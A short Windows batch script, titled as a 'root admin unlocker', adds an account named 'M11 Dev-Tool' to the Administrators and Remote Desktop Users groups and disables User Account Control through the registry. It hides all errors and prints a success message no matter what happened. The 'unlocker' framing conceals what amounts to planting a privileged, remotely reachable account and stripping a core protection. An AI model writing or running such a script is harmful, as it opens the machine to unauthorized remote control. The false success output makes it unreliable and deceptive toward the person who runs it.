@echo off
title M11 ROOT ADMIN UNLOCKER
color 0c
echo Unlocking Root Administrator Privileges...
net localgroup Administrators "M11 Dev-Tool" /add 2>nul
net localgroup "Remote Desktop Users" "M11 Dev-Tool" /add 2>nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f 2>nul
echo [SUCCESS] Full Unrestricted Administrator Privileges active!
pause
